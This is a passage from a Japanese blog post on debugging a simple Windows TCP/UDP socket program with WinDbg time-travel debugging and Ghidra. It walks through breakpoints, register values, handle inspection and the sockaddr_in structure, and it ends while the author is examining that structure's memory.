&lt;p&gt;参考：&lt;a href=&quot;https://github.com/kash1064/Try2WinDbg/blob/master/traces/win_tcp_udp.zip&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;kash1064/Try2WinDbg&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;socketの中身を追う&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#socket%E3%81%AE%E4%B8%AD%E8%BA%AB%E3%82%92%E8%BF%BD%E3%81%86&quot; aria-label=&quot;socketの中身を追う permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Socketの中身を追う&lt;/h3&gt;
&lt;p&gt;とりあえず最初の解析ターゲットとして、&lt;code class=&quot;language-text&quot;&gt;socket&lt;/code&gt;関数の挙動を追っていくことにします。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 550px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/31cf08774dc03bba6fb203b469fa0aae/dd45a/image-73.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 46.666666666666664%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAYAAAAywQxIAAAACXBIWXMAAAsTAAALEwEAmpwYAAABpElEQVQoz42SW2/bMAyF/f9/0wqsW7J6bdM2bTDUaJpuXRbk4qtkWfL1G31BXraH0jgQLZHnkJS8LFO8vW04hYo4gTxv6U1rx26nBt+WhkjHlE1FJ1/b/YtugqcSzWuwJtznxCfJ7hhJdMP7Jh38oizJBR8x7/HPNZe/5lwfVnw//mQRbXjp1ix1wOz3SvxXlvkK/3jLk17xlAcS88x9+sxD1q+BrAFB8yJY4/mZz8Xxki/xgov9Dz7tVty1S67M3bB33z7im1s+hzO+plfMtc8su+FbuhgwS26YK59F/SBY4llbksQxKqs4HiA8jaWXrsHk1eT3MQlGG5zV1KWlMTVNXlPmDuf0eVSec44sS+UShPAIh31H00BVCaGZCGV+fUxhzJBcCmElhJUIWiHU8n+eodY52+2WOCo4SIVp2lHXcim2IgzNeClFJUKavSBJLW3bx7Q0PZoR9eR7xhRS2UGILNK5JI+1O1cTichYYU2SFCIqz0dE0t6PC9mzQ55Sbiio78izhZXEUA4cJ2lZqe5MojI3zbAbxBJBKm81ihi6+J/9BbP7rreQUFCPAAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/31cf08774dc03bba6fb203b469fa0aae/8ac56/image-73.webp 240w,
/static/31cf08774dc03bba6fb203b469fa0aae/d3be9/image-73.webp 480w,
/static/31cf08774dc03bba6fb203b469fa0aae/12b65/image-73.webp 550w&quot;
              sizes=&quot;(max-width: 550px) 100vw, 550px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/31cf08774dc03bba6fb203b469fa0aae/8ff5a/image-73.png 240w,
/static/31cf08774dc03bba6fb203b469fa0aae/e85cb/image-73.png 480w,
/static/31cf08774dc03bba6fb203b469fa0aae/dd45a/image-73.png 550w&quot;
            sizes=&quot;(max-width: 550px) 100vw, 550px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/31cf08774dc03bba6fb203b469fa0aae/dd45a/image-73.png&quot;
            alt=&quot;image-73.png&quot;
            title=&quot;image-73.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;Ghidraのディスアセンブリ結果から&lt;code class=&quot;language-text&quot;&gt;0xdf726e&lt;/code&gt;にブレークポイントを設定し、&lt;code class=&quot;language-text&quot;&gt;g&lt;/code&gt;コマンドで処理を進めます。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;powershell&quot;&gt;&lt;pre class=&quot;language-powershell&quot;&gt;&lt;code class=&quot;language-powershell&quot;&gt;&gt; bu 0x00df726e
&gt; g&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;Step into&lt;/code&gt;で&lt;code class=&quot;language-text&quot;&gt;socket&lt;/code&gt;関数の中に入ってみると、&lt;code class=&quot;language-text&quot;&gt;Prolog&lt;/code&gt;とついたオブジェクトを扱っているように見えます。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 630px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/5aa795fee13d8d07c18442c435645cfe/f058b/image-74.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 46.666666666666664%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAYAAAAywQxIAAAACXBIWXMAAAsTAAALEwEAmpwYAAABn0lEQVQoz42S2Y6bQBRE/f8/lNdR3iZKRhlLxpCAw05jFoON2emTC7YUZZ6mpVI1EpzuqsvO+fUV6/AF13lhbA3AZmgM/NNPutte/IVL9oOpN9CjyTKYm38UT98FocJxAnxfkeVX1jXPkJ7lnQkSVdK1M59dO9/3sCwT33MJZL8+N7c7SdIzDAPnTHGKUyw52AoTjD8Bpp9g+RFxFJLnGWWRo1RCXVcr0Md2bDzP25TnOW07oNKRZZy5BleOe8X315D9N8X7u+LtNeL4llKVlRx4pmnuTNMkyWZ2p9MJ0zQltk1RlI/Ik8YPevpuIJWbNWXNLatAfyKy4zgcjAOrn9OUrusY+gnX7eWmPUESUNQl2SWjnTq6sdt8WIatkqZpGMdxg2mtHx3atkR+9peeV+hInAzMw0IXCyBsubt36t81V+9Kday4uTfpunlW1P4Drr2tQF88DEMptpYuNFEsQ5Hp9qHcyu9AyReZ6CKKRMX/UVfYFjlVahvGCosimVwSUcjvE8UylHmhN6RLib+oBR1pdCYqRaFI6Q20wfQD+hcxwKsrrj13jwAAAABJRU5ErkJggg==&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/5aa795fee13d8d07c18442c435645cfe/8ac56/image-74.webp 240w,
/static/5aa795fee13d8d07c18442c435645cfe/d3be9/image-74.webp 480w,
/static/5aa795fee13d8d07c18442c435645cfe/8aab1/image-74.webp 630w&quot;
              sizes=&quot;(max-width: 630px) 100vw, 630px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/5aa795fee13d8d07c18442c435645cfe/8ff5a/image-74.png 240w,
/static/5aa795fee13d8d07c18442c435645cfe/e85cb/image-74.png 480w,
/static/5aa795fee13d8d07c18442c435645cfe/f058b/image-74.png 630w&quot;
            sizes=&quot;(max-width: 630px) 100vw, 630px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/5aa795fee13d8d07c18442c435645cfe/f058b/image-74.png&quot;
            alt=&quot;image-74.png&quot;
            title=&quot;image-74.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;Prolog&lt;/code&gt;に関してはしばらく調べたものの該当しそうな情報が見つからなかったのでいったんスキップしました。&lt;/p&gt;
&lt;p&gt;誰か詳しい人いたら教えてください。。&lt;/p&gt;
&lt;h3 id=&quot;作成されたソケット&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E4%BD%9C%E6%88%90%E3%81%95%E3%82%8C%E3%81%9F%E3%82%BD%E3%82%B1%E3%83%83%E3%83%88&quot; aria-label=&quot;作成されたソケット permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;作成されたソケット&lt;/h3&gt;
&lt;p&gt;続いて、&lt;code class=&quot;language-text&quot;&gt;socket&lt;/code&gt;関数の直後の行を見てみます。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 654px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/2e2565f594cff149c4bdd1c3b1b05539/68e9c/image-75.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 38.75%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAYAAAD5nd/tAAAACXBIWXMAAAsTAAALEwEAmpwYAAABu0lEQVQoz5WRW2/aUBCE+f+/pEoTpUoJhaioIEraB5KWVDTG+G7APjbgK8YX4OspeepjVxqd0e7qaGanpeoaijrHWbr8rdMZLLehbE5EScyRM/9TLeXHL2aTn/imyzEvSbwtyrNHYPpkwY7DNmUfxhSbhCJMLjwPIvIweuvLebFLycWOdB3SmnZumHaumXy84qn9npf7W14fOmj9O6bdG156Et1rnrtXTB7eMet/QB3eo3/toY0+YX7/jPmtj9pvo/ZuaZn6HabextA6bMSAbTDCW42heWJjDEiXYxJnTKgNEfoXEntEYo2JnEdi45FUQlgDhD/kWE9o6bqNKe1qmslq5XE8gmFUHIozwgkR9gbPDFhpPmtTIMwQV13jaCv0mYVnhSS7TN47I0sLeUPlFWWuyA8XNE1NU59YLkuqqsJ1HYJAUJYHqrJ8e6tS7jTUcl4UheT1v6HMVRVdN/g9m7FYqHLhjGUfqMsjkbUjMmUITk5mZeTLnL3ksRYTy368iMkMqSxISTIZzl4qtCwbx3FQFIUwDKTl80VhWdasvRVCSJtSpSd8PM+7KPYv8LFdm220vbgppYNaqv0Dgw5OWzAP3qIAAAAASUVORK5CYII=&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/2e2565f594cff149c4bdd1c3b1b05539/8ac56/image-75.webp 240w,
/static/2e2565f594cff149c4bdd1c3b1b05539/d3be9/image-75.webp 480w,
/static/2e2565f594cff149c4bdd1c3b1b05539/d7085/image-75.webp 654w&quot;
              sizes=&quot;(max-width: 654px) 100vw, 654px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/2e2565f594cff149c4bdd1c3b1b05539/8ff5a/image-75.png 240w,
/static/2e2565f594cff149c4bdd1c3b1b05539/e85cb/image-75.png 480w,
/static/2e2565f594cff149c4bdd1c3b1b05539/68e9c/image-75.png 654w&quot;
            sizes=&quot;(max-width: 654px) 100vw, 654px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/2e2565f594cff149c4bdd1c3b1b05539/68e9c/image-75.png&quot;
            alt=&quot;image-75.png&quot;
            title=&quot;image-75.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;socket&lt;/code&gt;関数は、作成したSocketを指すファイルディスクリプタを戻り値として返します。&lt;/p&gt;
&lt;p&gt;EAXレジスタの中身を見てみると以下の値が格納されていました。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;powershell&quot;&gt;&lt;pre class=&quot;language-powershell&quot;&gt;&lt;code class=&quot;language-powershell&quot;&gt;&gt; r eax
eax=00000150&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-socket&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;socket function (winsock2.h) - Win32 apps | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;このファイルディスクリプタを指すハンドルはTTDでは拾うことができませんが、ライブデバッグを行うと&lt;code class=&quot;language-text&quot;&gt;!handle&lt;/code&gt;コマンドで参照することができます。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;powershell&quot;&gt;&lt;pre class=&quot;language-powershell&quot;&gt;&lt;code class=&quot;language-powershell&quot;&gt;&gt; r eax
eax=00000108

&gt; &lt;span class=&quot;token operator&quot;&gt;!&lt;/span&gt;handle 108 f
Handle 108
  &lt;span class=&quot;token function&quot;&gt;Type&lt;/span&gt;         	File
  Attributes   	0
  GrantedAccess	0x16019f:
         ReadControl&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;WriteDac&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;Synch
         Read/List&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;Write&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt;Add&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;Append/SubDir/CreatePipe&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;ReadEA&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;WriteEA&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;ReadAttr&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;WriteAttr
  HandleCount  	2
  PointerCount 	65534
  No Object Specific Information available&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;ファイルオブジェクトの中身も見ようと思ったら多分カーネルデバッグを仕掛けないとだめなのかな？（たぶん）&lt;/p&gt;
&lt;h3 id=&quot;sockaddr_in構造体を読む&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#sockaddr_in%E6%A7%8B%E9%80%A0%E4%BD%93%E3%82%92%E8%AA%AD%E3%82%80&quot; aria-label=&quot;sockaddr_in構造体を読む permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;sockaddr_in構造体を読む&lt;/h3&gt;
&lt;p&gt;次に解析するのはソースコードでいうと以下の箇所です。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;sockaddr_in&lt;/span&gt; dstAddr&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;token function&quot;&gt;memset&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;dstAddr&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;dstAddr&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
dstAddr&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;sin_port &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;htons&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;port&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
dstAddr&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;sin_family &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; AF_INET&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
dstAddr&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;sin_addr&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;s_addr &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;inet_addr&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;destination&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;sockaddr_in&lt;/code&gt;のメモリ領域を確保して、ポート番号、アドレスファミリ、IPアドレスをセットしています。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;sockaddr_in&lt;/code&gt;構造体は以下の構造になっています。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;in_addr&lt;/code&gt;構造体には4バイトでIPv4アドレスが格納されます。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;sin_zero&lt;/code&gt;はシステムに予約された領域で、すべて0埋めされます。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;sockaddr_in&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;short&lt;/span&gt;          sin_family&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;else&lt;/span&gt;&lt;/span&gt;
  ADDRESS_FAMILY sin_family&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;endif&lt;/span&gt;&lt;/span&gt;
  USHORT         sin_port&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  IN_ADDR        sin_addr&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  CHAR           sin_zero&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt; SOCKADDR_IN&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;PSOCKADDR_IN&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/api/ws2def/ns-ws2def-sockaddr_in&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;SOCKADDR_IN (ws2def.h) - Win32 apps | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/api/winsock2/ns-winsock2-in_addr&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;in_addr (winsock2.h) - Win32 apps | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;ちなみに、&lt;code class=&quot;language-text&quot;&gt;sin_port&lt;/code&gt;と&lt;code class=&quot;language-text&quot;&gt;sin_addr&lt;/code&gt;にはネットワークバイトオーダの値を入れる必要があるため、ソースコードでは&lt;code class=&quot;language-text&quot;&gt;htons&lt;/code&gt;関数と&lt;code class=&quot;language-text&quot;&gt;inet_addr&lt;/code&gt;関数を使用しています。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-htons&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;htons function (winsock.h) - Win32 apps | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-inet_addr&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;inet_addr function (winsock2.h) - Win32 apps | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;解析対象の構造がおおむね確認できたところで、&lt;code class=&quot;language-text&quot;&gt;memset&lt;/code&gt;関数の呼び出し後のアドレス&lt;code class=&quot;language-text&quot;&gt;0xdf7227&lt;/code&gt;にブレークポイントを設定します。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 543px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/573d26875a221e470c21f73fe4403d2f/29579/image.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 66.25%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAYAAACpUE5eAAAACXBIWXMAAAsTAAALEwEAmpwYAAACr0lEQVQ4y02Te28bRRTF/f0/CRISBUpV8QcUEdLQhkCT5lGnjuOs196H9/3emfX+etaGhlldzazmzpl7zrkzM9YyjiPexsN1XeLI0LYcRmtGnPc/4NzfMg5QlxFNFdLUDduyxa86dpoHc8xnhNkREPytj+f5JMmA70En0M4Y1p9vuFte43U+909zxR2fwg238Q2L7COL8hqnWpKSkeg7AE6jLErKsiBN9wIcsWaq0LK5fsf5w1su7Qdu/Rdcbb/hoviF8+Q3/i5O+CO+4NfojJPyhMvh6r8KR1zHZb1eEyeWLDsyaHqLM/+As1wyThfUoWKDaQKKJKfOW4rU6h/6rgfJMhvs/nA4S3OyOCXe7XlaCqwEoz3n5h3LxZyu7wmCmO02ZLcreHIsy6Vl5VRsooogb/CygFlhK9pBIvsu7m5DkNUkdUdlW3LT4fz5Hav5R3o7kGc6JH093xDlGWVVsd/vMVOMe6yYzt50p/zenPDafcXL8Gde+mf8uJEu7Smn7T+s3n/P47+AWdqzepK7fksYtarU0jSWsjY0kq42PTPfiMIYcxfMJfodi3jH7TbF6yMCm+GcfasKrzDDSN/XqjIll3ZpmmidUBQZTTfQCrAfBmajHQ8aVmlFmRaUMiTYINE59OP64jWr+xtpaAXUieLUdFKfabbH5vvf+OpyGISEYUAUWYpyqmak0s3OX69E+RorneJ45GEBWxc2Cr0D5UuCuCZV4+6a9rkP00QOx7GoWGkztYFikOPnP6lCAYpy23S6uGAXyn1H5ni9zpQ40tSTmVmdPwMWeSFK6vZ4UEtM/1MfDriXb3jU0+uV13VWLyk+6BiGhl3UyJRBjAbpaHVp8wxYldKwLOXkoOQjYCX3HlYPPK5WGD3D/X7UvtF+rcoqzblMEVWtt3FLVBq+AOqF2CDCCgFdAAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/573d26875a221e470c21f73fe4403d2f/8ac56/image.webp 240w,
/static/573d26875a221e470c21f73fe4403d2f/d3be9/image.webp 480w,
/static/573d26875a221e470c21f73fe4403d2f/4b567/image.webp 543w&quot;
              sizes=&quot;(max-width: 543px) 100vw, 543px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/573d26875a221e470c21f73fe4403d2f/8ff5a/image.png 240w,
/static/573d26875a221e470c21f73fe4403d2f/e85cb/image.png 480w,
/static/573d26875a221e470c21f73fe4403d2f/29579/image.png 543w&quot;
            sizes=&quot;(max-width: 543px) 100vw, 543px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/573d26875a221e470c21f73fe4403d2f/29579/image.png&quot;
            alt=&quot;image.png&quot;
            title=&quot;image.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;ここで&lt;code class=&quot;language-text&quot;&gt;memset&lt;/code&gt;関数の戻り値を確認すると、確保されたアドレスが&lt;code class=&quot;language-text&quot;&gt;0x55d810&lt;/code&gt;から始まることがわかります。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;powershell&quot;&gt;&lt;pre class=&quot;language-powershell&quot;&gt;&lt;code class=&quot;language-powershell&quot;&gt;&gt; r eax
eax=0055d810&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;メモリアドレスを見てみると16バイト分の領域に値がセットされているように見えます。&lt;/p&gt;
